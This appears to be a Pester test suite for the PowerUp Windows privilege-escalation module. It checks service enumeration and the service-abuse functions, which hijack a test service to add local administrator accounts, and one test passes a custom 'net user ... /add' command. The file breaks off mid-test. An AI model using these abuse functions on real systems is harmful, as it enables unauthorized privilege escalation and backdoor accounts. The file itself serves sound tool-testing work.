Set-StrictMode -Version Latest

$TestScriptRoot = Split-Path $MyInvocation.MyCommand.Path -Parent
$ModuleRoot = Resolve-Path "$TestScriptRoot\.."

$ModuleManifest = "$ModuleRoot\Privesc\Privesc.psd1"
Remove-Module [P]rivesc
Import-Module $ModuleManifest -Force -ErrorAction Stop

# import PowerUp.ps1 manually so we expose the helper functions for testing
$PowerUpFile = "$ModuleRoot\Privesc\PowerUp.ps1"
Import-Module $PowerUpFile -Force -ErrorAction Stop



function Get-RandomName {
    $r = 1..8 | ForEach-Object{Get-Random -max 26}
    return ('abcdefghijklmnopqrstuvwxyz'[$r] -join '')
}

function Test-IsAdmin {
    return ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
}


########################################################
#
# PowerUp helper functions.
#
########################################################

Describe 'Get-ModifiablePath' {

    It 'Should output a file Path, Permissions, and IdentityReference in results.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force

        try {
            $Output = Get-ModifiablePath -Path $FilePath | Select-Object -First 1
            
            if ($Output.PSObject.Properties.Name -notcontains 'ModifiablePath') {
                Throw "Get-ModifiablePath result doesn't contain 'ModifiablePath' field."
            }

            if ($Output.PSObject.Properties.Name -notcontains 'Permissions') {
                Throw "Get-ModifiablePath result doesn't contain 'Permissions' field."
            }

            if ($Output.PSObject.Properties.Name -notcontains 'IdentityReference') {
                Throw "Get-ModifiablePath result doesn't contain 'IdentityReference' field."
            }
        }
        finally {
            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }

    It 'Should output the correct file path in results.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force

        try {
            $Output = Get-ModifiablePath -Path $FilePath | Select-Object -First 1
            $Output.ModifiablePath | Should Be $FilePath
        }
        finally {
            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }

    It 'Should return the proper permission set.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force

        try {
            $Output = Get-ModifiablePath -Path $FilePath | Select-Object -First 1

            if ($Output.Permissions -notcontains 'WriteData/AddFile') {
                Throw "Get-ModifiablePath result doesn't contain the proper permission set."
            }
        }
        finally {
            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }

    It 'Should extract a modifiable file specified as an argument in a command string.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force

        $CmdPath = "'C:\Windows\System32\nonexistent.exe' -i '$FilePath'"
        
        try {
            $Output = Get-ModifiablePath -Path $FilePath | Select-Object -First 1
            $Output.ModifiablePath | Should Be $FilePath
        }
        finally {
            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }

    It 'Should accept a path string over the pipeline.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force

        try {
            $Output = $FilePath | Get-ModifiablePath
            $Output | Should Not BeNullOrEmpty
        }
        finally {
            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }

    It 'Should accept a file object over the pipeline.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force

        try {
            $Output = Get-ChildItem -Path $FilePath | Get-ModifiablePath
            $Output | Should Not BeNullOrEmpty
        }
        finally {
            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }
}


Describe 'Get-ProcessTokenGroup' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-ProcessTokenGroup' Pester test needs local administrator privileges."
    }

    It 'Should not throw.' {
        {Get-ProcessTokenGroup} | Should Not Throw
    }

    It 'Should return SID, Attribute, and ProcessID.' {
        $Output = Get-ProcessTokenGroup | Select-Object -First 1

        if ($Output.PSObject.Properties.Name -notcontains 'SID') {
            Throw "Get-ProcessTokenGroup result doesn't contain 'SID' field."
        }

        if ($Output.PSObject.Properties.Name -notcontains 'Attributes') {
            Throw "Get-ProcessTokenGroup result doesn't contain 'Attributes' field."
        }

        if ($Output.PSObject.Properties.Name -notcontains 'ProcessID') {
            Throw "Get-ProcessTokenGroup result doesn't contain 'ProcessID' field."
        }
    }

    It 'Should accept a process object on the pipeline.' {
        $Output = Get-Process -Id $PID | Get-ProcessTokenGroup | Select-Object -First 1
        $Output | Should Not BeNullOrEmpty
    }

    It 'Should accept multiple process objects on the pipeline.' {
        $Output = @($(Get-Process -Id $PID), $(Get-Process -Id $PID)) | Get-ProcessTokenGroup | Where-Object {$_.SID -match 'S-1-5-32-544'}
        if ($Output.Length -lt 2) {
            Throw "'Get-ProcessTokenGroup' doesn't return Dacls for multiple service objects on the pipeline."
        }
    }

    It 'Should return the local administrators group SID.' {
        $CurrentUserSids = Get-ProcessTokenGroup | Select-Object -ExpandProperty SID

        if ($CurrentUserSids -notcontains 'S-1-5-32-544') {
            Throw "Get-ProcessTokenGroup result doesn't contain local administrators 'S-1-5-32-544' sid"
        }
    }
}


Describe 'Get-ProcessTokenPrivilege' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-ProcessTokenPrivilege' Pester test needs local administrator privileges."
    }

    It 'Should not throw.' {
        {Get-ProcessTokenPrivilege} | Should Not Throw
    }

    It 'Should return Privilege, Attribute, and ProcessID.' {
        $Output = Get-ProcessTokenPrivilege | Select-Object -First 1

        if ($Output.PSObject.Properties.Name -notcontains 'Privilege') {
            Throw "Get-ProcessTokenPrivilege result doesn't contain 'Privilege' field."
        }

        if ($Output.PSObject.Properties.Name -notcontains 'Attributes') {
            Throw "Get-ProcessTokenPrivilege result doesn't contain 'Attributes' field."
        }

        if ($Output.PSObject.Properties.Name -notcontains 'ProcessID') {
            Throw "Get-ProcessTokenPrivilege result doesn't contain 'ProcessID' field."
        }
    }

    It 'Should accept the -Special argument' {
        $Output = Get-Process -Id $PID | Get-ProcessTokenPrivilege -Special | Select-Object -First 1
        $Output | Should Not BeNullOrEmpty
    }

    It 'Should accept a process object on the pipeline.' {
        $Output = Get-Process -Id $PID | Get-ProcessTokenPrivilege | Select-Object -First 1
        $Output | Should Not BeNullOrEmpty
    }

    It 'Should accept multiple process objects on the pipeline.' {
        $Output = @($(Get-Process -Id $PID), $(Get-Process -Id $PID)) | Get-ProcessTokenPrivilege | Where-Object {$_.Privilege -match 'SeShutdownPrivilege'}
        if ($Output.Length -lt 2) {
            Throw "'Get-ProcessTokenPrivilege' doesn't return Dacls for multiple service objects on the pipeline."
        }
    }

    It 'Should return the correct privileges.' {
        $Privileges = Get-ProcessTokenPrivilege | Select-Object -ExpandProperty Privilege

        if ($Privileges -NotContains 'SeShutdownPrivilege') {
            Throw "Get-ProcessTokenPrivilege result doesn't the SeShutdownPrivilege"
        }
    }
}


Describe 'Enable-Privilege' {
    if (-not $(Test-IsAdmin)) {
        Throw "'Enable-Privilege' Pester test needs local administrator privileges."
    }

    It 'Should not accept an invalid privilege.' {
        {Enable-Privilege -Privilege 'nonexistent'} | Should Throw
    }

    It 'Should successfully enable a specified privilege.' {
        $Output = Get-ProcessTokenPrivilege | Where-Object {$_.Privilege -match 'SeShutdownPrivilege'}
        if ($Output.Attributes -ne 0) {
            Throw "'SeShutdownPrivilege is already enabled."
        }
        {Enable-Privilege -Privilege 'SeShutdownPrivilege'} | Should Not Throw
        $Output = Get-ProcessTokenPrivilege | Where-Object {$_.Privilege -match 'SeShutdownPrivilege'}
        if ($Output.Attributes -eq 0) {
            Throw "'SeShutdownPrivilege not successfully enabled."
        }
    }

    It 'Should accept the output from Get-ProcessTokenPrivilege.' {
        {Get-ProcessTokenPrivilege | Enable-Privilege} | Should Not Throw
        $Output = Get-ProcessTokenPrivilege | Where-Object {$_.Privilege -match 'SeBackupPrivilege'}
        if ($Output.Attributes -eq 0) {
            Throw "'SeBackupPrivilege not successfully enabled."
        }
    }
}


Describe 'Add-ServiceDacl' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Add-ServiceDacl' Pester test needs local administrator privileges."
    }

    It 'Should not throw.' {
        {Get-Service | Add-ServiceDacl} | Should Not Throw
    }

    It 'Should fail for a non-existent service.' {
        $ServiceName = Get-RandomName
        {$Result = Add-ServiceDacl -Name $ServiceName} | Should Throw
    }

    It 'Should accept a service name as a parameter argument.' {
        $ServiceName = Get-Service | Select-Object -First 1 | Select-Object -ExpandProperty Name
        $ServiceWithDacl = Add-ServiceDacl -Name $ServiceName

        if (-not $ServiceWithDacl.Dacl) {
            Throw "'Add-ServiceDacl' doesn't return a Dacl for a service passed as parameter."
        }
    }

    It 'Should accept an array of service names as a parameter argument.' {
        $ServiceNames = Get-Service | Select-Object -First 5 | Select-Object -ExpandProperty Name
        $ServicesWithDacl = Add-ServiceDacl -Name $ServiceNames

        if (-not $ServicesWithDacl.Dacl) {
            Throw "'Add-ServiceDacl' doesn't return Dacls for an array of service names as a parameter."
        }
    }

    It 'Should accept a service object on the pipeline.' {
        $Service = Get-Service | Select-Object -First 1
        $ServiceWithDacl = $Service | Add-ServiceDacl

        if (-not $ServiceWithDacl.Dacl) {
            Throw "'Add-ServiceDacl' doesn't return a Dacl for a service object on the pipeline."
        }
    }

    It 'Should accept a service name on the pipeline.' {
        $ServiceName = Get-Service | Select-Object -First 1 | Select-Object -ExpandProperty Name
        $ServiceWithDacl = $ServiceName | Add-ServiceDacl

        if (-not $ServiceWithDacl.Dacl) {
            Throw "'Add-ServiceDacl' doesn't return a Dacl for a service name on the pipeline."
        }
    }

    It 'Should accept multiple service objects on the pipeline.' {
        $Services = Get-Service | Select-Object -First 5
        $ServicesWithDacl = $Services | Add-ServiceDacl

        if (-not $ServicesWithDacl.Dacl) {
            Throw "'Add-ServiceDacl' doesn't return Dacls for multiple service objects on the pipeline."
        }
    }

    It 'Should accept multiple service names on the pipeline.' {
        $ServiceNames = Get-Service | Select-Object -First 5 | Select-Object -ExpandProperty Name
        $ServicesWithDacl = $ServiceNames | Add-ServiceDacl

        if (-not $ServicesWithDacl.Dacl) {
            Throw "'Add-ServiceDacl' doesn't return Dacls for multiple service names on the pipeline."
        }
    }

    It 'Should return a correct service Dacl.' {
        $Service = Get-Service | Select-Object -First 1
        $ServiceWithDacl = $Service | Add-ServiceDacl

        # 'AllAccess' = [uint32]'0x000F01FF'
        $Rights = $ServiceWithDacl.Dacl | Where-Object {$_.SecurityIdentifier -eq 'S-1-5-32-544'}
        if (($Rights.AccessRights -band 0x000F01FF) -ne 0x000F01FF) {
            Throw "'Add-ServiceDacl' doesn't return the correct service Dacl."
        }
    }
}

Describe 'Set-ServiceBinaryPath' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Set-ServiceBinaryPath' Pester test needs local administrator privileges."
    }

    It 'Should fail for a non-existent service.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'

        $Result = $False
        {$Result = Set-ServiceBinaryPath -Name $ServiceName -Path $ServicePath} | Should Throw
        $Result | Should Be $False
    }

    It 'Should throw with an empty Path.' {
        $ServiceName = Get-RandomName
        {Set-ServiceBinaryPath -Name $ServiceName -Path ''} | Should Throw
    }

    It 'Should correctly set a service binary path.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Result = Set-ServiceBinaryPath -Name $ServiceName -Path $ServicePath
        $Result | Should Be $True
        $ServiceDetails = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'"
        $ServiceDetails.PathName | Should be $ServicePath

        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }

    It 'Should accept a service name as a string on the pipeline.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Result = $ServiceName | Set-ServiceBinaryPath -Path $ServicePath
        $Result | Should Be $True

        $ServiceDetails = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'"
        $ServiceDetails.PathName | Should be $ServicePath
        
        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }

    It 'Should accept a service object on the pipeline.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Result = Get-Service $ServiceName | Set-ServiceBinaryPath -Path $ServicePath
        $Result | Should Be $True
        
        $ServiceDetails = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'"
        $ServiceDetails.PathName | Should be $ServicePath
        
        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }
}


Describe 'Test-ServiceDaclPermission' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Test-ServiceDaclPermission' Pester test needs local administrator privileges."
    }

    It 'Should fail for a non-existent service.' {
        $ServiceName = Get-RandomName
        {$Result = Test-ServiceDaclPermission -Name $ServiceName} | Should Throw
    }

    It 'Should throw with an empty name.' {
        {Test-ServiceDaclPermission -Name ''} | Should Throw
    }

    It 'Should throw with an invalid permission parameter.' {
        $ServiceName = Get-RandomName
        {Test-ServiceDaclPermission -Name $ServiceName -Permissions 'nonexistent'} | Should Throw
    }

    It 'Should throw with an invalid permission set parameter.' {
        $ServiceName = Get-RandomName
        {Test-ServiceDaclPermission -Name $ServiceName -PermissionSet 'nonexistent'} | Should Throw
    }

    It 'Should succeed with an existing service.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Result = Test-ServiceDaclPermission -Name $ServiceName
        $Result | Should Not BeNullOrEmpty

        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }

    It 'Should succeed with an existing service.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1
        
        $Result = Test-ServiceDaclPermission -Name $ServiceName
        $Result | Should Not BeNullOrEmpty

        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }

    It 'Should succeed with a permission parameter.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Result = Test-ServiceDaclPermission -Name $ServiceName -Permissions 'AllAccess'
        $Result | Should Not BeNullOrEmpty

        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }

    It 'Should succeed with a permission set parameter.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Result = Test-ServiceDaclPermission -Name $ServiceName -PermissionSet 'ChangeConfig'
        $Result | Should Not BeNullOrEmpty

        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }

    It 'Should accept a service name as a string on the pipeline.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Result = $ServiceName | Test-ServiceDaclPermission
        $Result | Should Not BeNullOrEmpty

        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }

    It 'Should accept a service object on the pipeline.' {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Result = Get-Service $ServiceName | Test-ServiceDaclPermission
        $Result | Should Not BeNullOrEmpty

        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }

    It "Should fail for an existing service due to insufficient DACL permissions." {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        $UserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value
        
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1
        
        sc.exe sdset $ServiceName "D:(A;;CCDCSWRPWPDTLOCRSDRCWDWO;;;$UserSid)" | Should Match 'SUCCESS'
        
        {Test-ServiceDaclPermission -Name $ServiceName} | Should Throw

        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    }
    
    It "Should succeed with for an existing service due to sufficient specific DACL permissions." {
        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'
        $UserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value
        
        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1
        
        sc.exe sdset $ServiceName "D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$UserSid)" | Should Match 'SUCCESS'

        $Result = Test-ServiceDaclPermission -Name $ServiceName
        $Result | Should Not BeNullOrEmpty

        sc.exe delete $ServiceName | Should Match 'SUCCESS'
    } 
}

########################################################
#
# PowerUp service enumeration functions.
#
########################################################

Describe 'Get-UnquotedService' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-UnquotedService' Pester test needs local administrator privileges."
    }

    It "Should not throw." {
        {Get-UnquotedService} | Should Not Throw
    }

    It 'Should return service with a space in an unquoted binPath.' {

        $ServiceName = Get-RandomName
        $ServicePath = 'C:\Program Files\service.exe'

        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Output = Get-UnquotedService | Where-Object { $_.ServiceName -eq $ServiceName }
        sc.exe delete $ServiceName | Should Match 'SUCCESS'

        $Output | Should Not BeNullOrEmpty
        $Output.ServiceName | Should Be $ServiceName
        $Output.Path | Should Be $ServicePath
    }

    It 'Should not return services with a quoted binPath.' {
        $ServiceName = Get-RandomName
        $ServicePath = "'C:\Program Files\service.exe'"

        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
        Start-Sleep -Seconds 1

        $Output = Get-UnquotedService | Where-Object { $_.ServiceName -eq $ServiceName }
        sc.exe delete $ServiceName | Should Match 'SUCCESS'

        $Output | Should BeNullOrEmpty
    }
}


Describe 'Get-ModifiableServiceFile' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-ModifiableServiceFile ' Pester test needs local administrator privileges."
    }

    It 'Should not throw.' {
        {Get-ModifiableServiceFile} | Should Not Throw
    }

    It 'Should return a service with a modifiable service binary.' {
        try {
            $ServiceName = Get-RandomName
            $ServicePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())" + ".exe"
            $Null | Out-File -FilePath $ServicePath -Force

            sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'

            $Output = Get-ModifiableServiceFile | Where-Object { $_.ServiceName -eq $ServiceName } | Select-Object -First 1

            $Properties = $Output.PSObject.Properties | Select-Object -ExpandProperty Name
            if ($Properties -notcontains 'ServiceName') {
                Throw "Get-ModifiableServiceFile result doesn't contain 'ServiceName' field."
            }
            if ($Properties -notcontains 'Path') {
                Throw "Get-ModifiableServiceFile result doesn't contain 'Path' field."
            }
            if ($Properties -notcontains 'ModifiableFile') {
                Throw "Get-ModifiableServiceFile result doesn't contain 'ModifiableFile' field."
            }
            if ($Properties -notcontains 'ModifiableFilePermissions') {
                Throw "Get-ModifiableServiceFile result doesn't contain 'ModifiableFilePermissions' field."
            }
            if ($Properties -notcontains 'ModifiableFileIdentityReference') {
                Throw "Get-ModifiableServiceFile result doesn't contain 'ModifiableFileIdentityReference' field."
            }
            if ($Properties -notcontains 'StartName') {
                Throw "Get-ModifiableServiceFile result doesn't contain 'StartName' field."
            }
            if ($Properties -notcontains 'AbuseFunction') {
                Throw "Get-ModifiableServiceFile result doesn't contain 'AbuseFunction' field."
            }
            if ($Properties -notcontains 'CanRestart') {
                Throw "Get-ModifiableServiceFile result doesn't contain 'CanRestart' field."
            }

            if ($Output.Path -ne $ServicePath) {
                Throw "Get-ModifiableServiceFile result doesn't return correct Path for a modifiable service file."
            }

            if ($Output.ModifiableFile -ne $ServicePath) {
                Throw "Get-ModifiableServiceFile result doesn't return correct ModifiableFile for a modifiable service file."
            }

            $Output.CanRestart | Should Be $True

            sc.exe delete $ServiceName | Should Match 'SUCCESS'
        }
        finally {
            $Null = Remove-Item -Path $ServicePath -Force
        }
    }
}


Describe 'Get-ModifiableService' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-ModifiableService' Pester test needs local administrator privileges."
    }

    It 'Should not throw.' {
        {Get-ModifiableService} | Should Not Throw
    }

    It 'Should return a modifiable service.' {
        $Output = Get-ModifiableService | Where-Object { $_.ServiceName -eq 'Dhcp'} | Select-Object -First 1
        $Output | Should Not BeNullOrEmpty

        $Properties = $Output.PSObject.Properties | Select-Object -ExpandProperty Name
        if ($Properties -notcontains 'ServiceName') {
            Throw "Get-ModifiableService result doesn't contain 'ServiceName' field."
        }
        if ($Properties -notcontains 'Path') {
            Throw "Get-ModifiableService result doesn't contain 'Path' field."
        }
        if ($Properties -notcontains 'StartName') {
            Throw "Get-ModifiableService result doesn't contain 'StartName' field."
        }
        if ($Properties -notcontains 'AbuseFunction') {
            Throw "Get-ModifiableService result doesn't contain 'AbuseFunction' field."
        }
        if ($Properties -notcontains 'CanRestart') {
            Throw "Get-ModifiableService result doesn't contain 'CanRestart' field."
        }
    }
}


Describe 'Get-ServiceDetail' {

    It 'Should return results for a valid service.' {
        $Output = Get-ServiceDetail -Name 'Dhcp'
        $Output | Should Not BeNullOrEmpty
    }

    It 'Should throw with an empty Name.' {
        $ServiceName = Get-RandomName
        {Get-ServiceDetail -Name ''} | Should Throw
    }

    It 'Should throw for an invalid service.' {
        {Get-ServiceDetail -Name 'NonExistent123'} | Should Throw
    }

    It 'Should accept a service name on the pipeline.' {
        $Output = 'Dhcp' | Get-ServiceDetail
        $Output | Should Not BeNullOrEmpty
    }

    It 'Should accept a service object on the pipeline.' {
        $Output = Get-Service 'Dhcp' | Get-ServiceDetail
        $Output | Should Not BeNullOrEmpty
    }
}



########################################################
#
# PowerUp service abuse functions.
#
########################################################

Describe 'Invoke-ServiceAbuse' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Invoke-ServiceAbuse' Pester test needs local administrator privileges."
    }

    BeforeEach {
        $ServicePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())" + ".exe"
        $Null = sc.exe create 'PowerUpService' binPath= $ServicePath
    }

    AfterEach {
        $Null = sc.exe delete 'PowerUpService'
        $Null = $(net user john /delete >$Null 2>&1)
    }

    It 'Should abuse a vulnerable service to add a local administrator with default options.' {
        $Output = Invoke-ServiceAbuse -Name 'PowerUpService'
        $Output.Command | Should Match 'net'

        if ( -not ($(net localgroup Administrators) -match 'john')) {
            Throw "Local user 'john' not created."
        }
    }

    It 'Should accept the -Force switch.' {
        $Output = Invoke-ServiceAbuse -Name 'PowerUpService' -Force
        $Output.Command | Should Match 'net'

        if ( -not ($(net localgroup Administrators) -match 'john')) {
            Throw "Local user 'john' not created."
        }
    }

    It 'Should accept a service name on the pipeline.' {
        $Output = 'PowerUpService' | Invoke-ServiceAbuse
        $Output.Command | Should Match 'net'

        if ( -not ($(net localgroup Administrators) -match 'john')) {
            Throw "Local user 'john' not created."
        }
    }

    It 'Should accept a service object on the pipeline.' {
        $Output = Get-Service 'PowerUpService' | Invoke-ServiceAbuse
        $Output.Command | Should Match 'net'

        if ( -not ($(net localgroup Administrators) -match 'john')) {
            Throw "Local user 'john' not created."
        }
    }

    It 'User should not be created for a non-existent service.' {
        {Invoke-ServiceAbuse -ServiceName 'NonExistentService456'} | Should Throw

        if ( ($(net localgroup Administrators) -match 'john')) {
            Throw "Local user 'john' should not have been created for non-existent service."
        }
    }

    It 'Should accept custom user/password arguments.' {
        $Output = Invoke-ServiceAbuse -ServiceName 'PowerUpService' -Username 'PowerUp' -Password 'PASSword123!'
        $Output.Command | Should Match 'net'

        if ( -not ($(net localgroup Administrators) -match 'PowerUp')) {
            Throw "Local user 'PowerUp' not created."
        }
        $Null = $(net user PowerUp /delete >$Null 2>&1)
    }

    It 'Should accept a credential object.' {
        $Username = 'PowerUp123'
        $Password = ConvertTo-SecureString 'PASSword123!' -AsPlaintext -Force 
        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $Password

        $Output = Invoke-ServiceAbuse -ServiceName 'PowerUpService' -Credential $Credential
        $Output.Command | Should Match 'net'

        if ( -not ($(net localgroup Administrators) -match 'PowerUp')) {
            Throw "Local user 'PowerUp' not created."
        }
        $Null = $(net user PowerUp123 /delete >$Null 2>&1)
    }

    It 'Should accept an alternate LocalGroup.' {
        $Output = Invoke-ServiceAbuse -Name 'PowerUpService' -LocalGroup 'Guests'
        $Output.Command | Should Match 'net'

        if ( -not ($(net localgroup Guests) -match 'john')) {
            Throw "Local user 'john' not added to 'Guests'."
        }
    }

    It 'Should accept a custom command.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Output = Invoke-ServiceAbuse -ServiceName 'PowerUpService' -Command 'net user testing Password123! /add'

        if ( -not ($(net user) -match "testing")) {
            Throw 'Custom command failed.'
        }
        $Null = $(net user testing /delete >$Null 2>&1)
    }
}


Describe 'Install-ServiceBinary' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Install-ServiceBinary' Pester test needs local administrator privileges."
    }

    BeforeEach {
        $ServicePath = "$(Get-Location)\powerup.exe"
        $Null | Out-File -FilePath $ServicePath -Force
        $Null = sc.exe create 'PowerUpService' binPath= $ServicePath
    }

    AfterEach {
        try {
            $Null = Stop-Service -Name PowerUpService -Force
            $Null = sc.exe delete 'PowerUpService'
            $Null = $(net user john /delete >$Null 2>&1)
        }
        finally {
            if (Test-Path "$(Get-Location)\powerup.exe") {
                $Null = Remove-Item -Path "$(Get-Location)\powerup.exe" -Force -ErrorAction SilentlyContinue
            }
            if (Test-Path "$(Get-Location)\powerup.exe.bak") {
                $Null = Remove-Item -Path "$(Get-Location)\powerup.exe.bak" -Force -ErrorAction SilentlyContinue
            }
        }
    }

    It 'Should abuse a vulnerable service binary to add a local administrator with default options.' {
        $Output = Install-ServiceBinary -ServiceName 'PowerUpService'
        $Output.Command | Should Match 'net'

        $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
        if ( -not ($(net localgroup Administrators) -match 'john')) {
            Throw "Local user 'john' not created."
        }
        $Null = Stop-Service -Name PowerUpService -Force

        $Output = Restore-ServiceBinary -ServiceName PowerUpService
        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
    }

    It 'Should accept a service Name on the pipeline.' {
        $Output = 'PowerUpService' | Install-ServiceBinary
        $Output.Command | Should Match 'net'

        $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
        if ( -not ($(net localgroup Administrators) -match 'john')) {
            Throw "Local user 'john' not created."
        }
        $Null = Stop-Service -Name PowerUpService -Force

        $Output = Restore-ServiceBinary -ServiceName PowerUpService
        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
    }

    It 'Should accept a service object on the pipeline.' {
        $Output = Get-Service 'PowerUpService' | Install-ServiceBinary
        $Output.Command | Should Match 'net'

        $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
        if ( -not ($(net localgroup Administrators) -match 'john')) {
            Throw "Local user 'john' not created."
        }
        $Null = Stop-Service -Name PowerUpService -Force

        $Output = Restore-ServiceBinary -ServiceName PowerUpService
        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
    }

    It 'User should not be created for a non-existent service.' {
        {Install-ServiceBinary -ServiceName "NonExistentService456"} | Should Throw
        
        if ( ($(net localgroup Administrators) -match 'john')) {
            Throw "Local user 'john' should not have been created for non-existent service."
        }
    }

    It 'Should accept custom user/password arguments.' {
        try {
            $Output = Install-ServiceBinary -ServiceName 'PowerUpService' -Username 'PowerUp' -Password 'PASSword123!'
            $Output.Command | Should Match 'net'

            $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 3
            if ( -not ($(net localgroup Administrators) -match 'PowerUp')) {
                Throw "Local user 'PowerUp' not created."
            }

            $Output = Restore-ServiceBinary -ServiceName PowerUpService
            "$(Get-Location)\powerup.exe.bak" | Should Not Exist
        }
        finally {
            $Null = $(net user PowerUp /delete >$Null 2>&1)
        }
    }

    It 'Should accept a credential object.' {
        $Username = 'PowerUp123'
        $Password = ConvertTo-SecureString 'PASSword123!' -AsPlaintext -Force 
        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $Password

        $Output = Install-ServiceBinary -ServiceName 'PowerUpService' -Credential $Credential
        $Output.Command | Should Match 'net'

        $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
        if ( -not ($(net localgroup Administrators) -match 'PowerUp123')) {
            Throw "Local user 'PowerUp123' not created."
        }
        $Null = $(net user PowerUp123 /delete >$Null 2>&1)

        $Output = Restore-ServiceBinary -ServiceName PowerUpService
        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
    }

    It 'Should accept an alternate LocalGroup.' {
        try {
            $Output = Install-ServiceBinary -ServiceName 'PowerUpService' -Username 'PowerUp' -Password 'PASSword123!' -LocalGroup 'Guests'
            $Output.Command | Should Match 'net'

